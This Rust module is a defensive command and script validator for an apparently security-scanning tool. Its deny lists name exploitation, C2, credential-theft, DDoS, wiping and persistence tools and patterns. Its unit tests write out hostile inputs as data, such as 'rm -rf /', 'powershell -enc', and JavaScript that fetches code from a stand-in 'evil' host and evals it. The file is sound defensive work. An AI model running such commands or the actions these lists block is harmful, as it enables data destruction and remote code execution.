// 安全红线：扩展 / 编排只允许"无害检测与挖掘"，一律禁止——
//   1) 执行攻击服务（exploit / 爆破 / 抓鸡 / C2 / DDoS 等）；
//   2) 持久攻击任务（计划任务 / 自启 / 无上限循环，编排另有总时长上限）；
//   3) 恶意破坏计算机（删文件 / 格式化 / 关机 / 写系统区）；
//   4) 写入或执行恶意脚本（module 技能为纯分析函数，禁子进程 / 网络 / 写盘 / 持久化）。
// 采用启发式黑名单：命中即拒绝并审计，宁可误拦不可放过。
use serde_json::Value;

/// 单编排总时长上限（毫秒）：防止"持久攻击 / 永不结束"任务
pub const MAX_PIPELINE_MS: u64 = 10 * 60 * 1000;

/// 攻击 / 破坏 / 持久化 /  shells / 解释器 命令名黑名单（按可执行文件基名匹配）。
/// cli/stdio 传输只允许独立安全工具二进制；脚本一律走 module（源码会被扫描）。
const DENY_TOOLS: &[&str] = &[
    // exploit / 后渗透 / C2
    "msfconsole", "msfvenom", "metasploit", "meterpreter", "cobaltstrike", "beacon", "sliver",
    "havoc", "mythic", "poshc2", "empire", "starkiller", "mimikatz", "lazagne", "pwdump", "fgdump",
    "psexec", "wmiexec", "smbexec", "atexec", "evil-winrm", "responder", "bettercap", "ettercap",
    // 爆破 / 破解
    "hydra", "medusa", "ncrack", "hashcat", "john", "aircrack-ng", "reaver", "bully", "wifite",
    // DDoS / 压力洪水
    "loic", "hoic", "xoic", "slowloris", "slowhttptest", "hping3", "hping", "goldeneye",
    "torshammer", "rudy", "tfn", "trinoo", "stacheldraht", "siege", "ab", "wrk", "hey", "vegeta",
    // 破坏 / 格式化 / 关机 / 擦除
    "rm", "rmdir", "del", "erase", "rd", "shred", "sdelete", "wipe", "format", "mkfs", "diskpart",
    "cipher", "vssadmin", "bcdedit", "shutdown", "reboot", "halt", "poweroff", "dd",
    // 持久化 / 服务 / 计划任务 / 注册表
    "schtasks", "crontab", "at", "launchctl", "systemctl", "reg", "regedit", "sc", "nssm",
    // shell / 脚本解释器 / Living-off-the-land（禁止借道执行任意命令）
    "cmd", "powershell", "pwsh", "bash", "sh", "zsh", "dash", "ksh", "csh", "tcsh", "fish",
    "wscript", "cscript", "mshta", "rundll32", "regsvr32", "installutil",
    "python", "python3", "py", "node", "nodejs", "perl", "ruby", "php",
];

/// 参数级危险模式（小写子串匹配）：利用 / 破坏 / 持久化 / 洪水 / 远程代码执行
const DENY_ARG_PATTERNS: &[&str] = &[
    // 破坏
    "rm -rf", "rm -fr", "-rf /", "of=/dev/", "if=/dev/zero", "if=/dev/random", "format c:",
    "del /s", "del /q", "rd /s", "rmdir /s", "cipher /w", "vssadmin delete", "shutdown", "reboot",
    // 利用 / 接管 / 反弹 shell
    "--os-shell", "--os-cmd", "--sql-shell", "--dump", "--dump-all", "--tamper", "--exploit",
    "--attack", "--dos", "--ddos", "--flood", "--brute", "--crack", "--shell", "--reverse",
    "--bind-shell", "meterpreter", "payload", "os-shell", "os-cmd", "sql-shell",
    // 持久化
    "schtasks", "crontab", "runonce", "currentversion\\run", "launchctl", "systemctl enable",
    "sc create", "new-service", "/create",
    // 洪水 / 高并发压测
    "ping -f", "-flood", "--threads 100", "-t 100", "--concurrency 1000", "-rate-limit 1000",
    // 编码 / 远程下载执行
    "-enc", "-encodedcommand", "downloadstring", "downloadfile", "invoke-expression", "iex(",
    "| sh", "| bash", "curl|", "wget|", "base64 -d",
];

/// module / 导入脚本源码黑名单：纯分析函数不允许子进程 / 网络 / 写盘 / 持久化 / 动态执行
const DENY_SCRIPT_PATTERNS: &[&str] = &[
    // 子进程 / 系统命令（杜绝借脚本发起攻击或破坏）
    "child_process", "execsync", "execfile", "spawn(", "exec(", "os.system", "subprocess",
    "pty.spawn", "commands.getoutput", "popen",
    // 网络外联 / 反弹 shell / 洪水（技能只分析传入的 html/headers）
    "net.connect", "net.createserver", "dgram", "http.request", "https.request", "fetch(",
    "axios", "urllib.request", "requests.get", "requests.post", "http.client", "socket.socket",
    // 写盘 / 写恶意可执行文件
    "writefilesync", "writefile(", "appendfilesync", "appendfile(", "fs.write", "shutil.copy",
    ".exe'", ".exe\"", ".bat'", ".bat\"", ".ps1'", ".ps1\"", ".vbs'", ".vbs\"", ".scr'", ".scr\"",
    // 破坏性删除
    "rmsync", "rmdirsync", "unlinksync", "shutil.rmtree", "os.remove", "os.rmdir", "fs.rm",
    // 持久化 / 注册表 / 自启
    "currentversion\\run", "runonce", "schtasks", "crontab", "launchctl", "winreg", "setvalueex",
    "startup",
    // 动态执行 / 远程代码
    "eval(", "new function", "vm.runin", "require('vm')",
    // 挖矿 / 键盘记录
    "coinhive", "cryptonight", "stratum+tcp", "keylog", "getasynckeystate",
];

fn basename(cmd: &str) -> String {
    let trimmed = cmd.trim().trim_matches('"').trim_matches('\'');
    let file = trimmed.rsplit(['/', '\\']).next().unwrap_or(trimmed);
    let lower = file.to_lowercase();
    lower.strip_suffix(".exe").or_else(|| lower.strip_suffix(".cmd")).or_else(|| lower.strip_suffix(".bat")).unwrap_or(&lower).to_string()
}

/// 校验 cli / stdio 命令与参数：命中攻击 / 破坏 / 持久化 / 洪水 / 解释器即拒绝
pub fn check_command(command: &str, args: &[String]) -> Result<(), String> {
    let name = basename(command);
    if name.is_empty() {
        return Err("命令为空".into());
    }
    if DENY_TOOLS.contains(&name.as_str()) {
        return Err(format!("安全红线：禁止执行攻击/破坏/持久化/解释器命令「{}」。扩展仅允许无害检测工具。", name));
    }
    let joined = args.join(" ").to_lowercase();
    for pat in DENY_ARG_PATTERNS {
        if joined.contains(pat) {
            return Err(format!("安全红线：命令参数命中危险模式「{}」（攻击/破坏/持久化/洪水/远程执行）。", pat));
        }
    }
    Ok(())
}

/// 校验 module / 导入脚本源码：命中恶意行为即拒绝（纯分析函数白名单语义）
pub fn check_script_source(content: &str) -> Result<(), String> {
    let lower = content.to_lowercase();
    for pat in DENY_SCRIPT_PATTERNS {
        if lower.contains(pat) {
            return Err(format!("安全红线：技能源码命中恶意模式「{}」（子进程/网络/写盘/破坏/持久化/动态执行/挖矿）。技能须为纯分析函数。", pat));
        }
    }
    Ok(())
}

/// 供编排/调用方在拒绝时写审计
pub fn deny_entry(action: &str, detail: &str) -> Value {
    serde_json::json!({ "action": "safety-deny", "target": action, "reason": detail, "ok": false })
}

#[cfg(test)]
mod tests {
    use super::*;

    fn args(v: &[&str]) -> Vec<String> { v.iter().map(|s| s.to_string()).collect() }

    #[test]
    fn allows_legit_detection_tools() {
        assert!(check_command("nuclei", &args(&["-u", "{url}", "-jsonl", "-silent"])).is_ok());
        assert!(check_command("sqlmap", &args(&["-u", "{url}", "--batch", "--output-dir=/tmp/sqlmap"])).is_ok());
        assert!(check_command("nikto", &args(&["-h", "{url}", "-Format", "json"])).is_ok());
        assert!(check_command("semgrep", &args(&["--config", "auto", "--json", "--quiet"])).is_ok());
        assert!(check_command("C:\\tools\\nuclei.exe", &args(&["-u", "https://x"])).is_ok());
    }

    #[test]
    fn denies_attack_and_destructive_commands() {
        assert!(check_command("hydra", &args(&["-l", "a", "-P", "p", "ssh://x"])).is_err());
        assert!(check_command("msfconsole", &args(&[])).is_err());
        assert!(check_command("loic", &args(&[])).is_err());
        assert!(check_command("rm", &args(&["-rf", "/"])).is_err());
        assert!(check_command("shutdown", &args(&["/s"])).is_err());
        assert!(check_command("schtasks", &args(&["/create"])).is_err());
        assert!(check_command("powershell", &args(&["-enc", "AAA"])).is_err());
        assert!(check_command("cmd", &args(&["/C", "del /s /q c:\\"])).is_err());
    }

    #[test]
    fn denies_exploitation_flags_on_scanners() {
        assert!(check_command("sqlmap", &args(&["-u", "x", "--os-shell"])).is_err());
        assert!(check_command("sqlmap", &args(&["-u", "x", "--dump-all"])).is_err());
        assert!(check_command("nuclei", &args(&["-u", "x", "-rate-limit", "1000"])).is_err());
    }

    #[test]
    fn allows_benign_skill_source() {
        let src = "export default function(input={},ctx={}){const h=input.html||'';return {output:{n:h.length},findings:[]};}";
        assert!(check_script_source(src).is_ok());
    }

    #[test]
    fn denies_malicious_skill_source() {
        assert!(check_script_source("const {exec}=require('child_process');exec('rm -rf /');").is_err());
        assert!(check_script_source("import fs from 'fs';fs.writeFileSync('a.exe','x');").is_err());
        assert!(check_script_source("fetch('http://evil/x').then(r=>r.text()).then(eval);").is_err());
        assert!(check_script_source("import os;os.system('shutdown /s')").is_err());
        assert!(check_script_source("const net=require('net');net.connect(4444,'evil');").is_err());
    }
}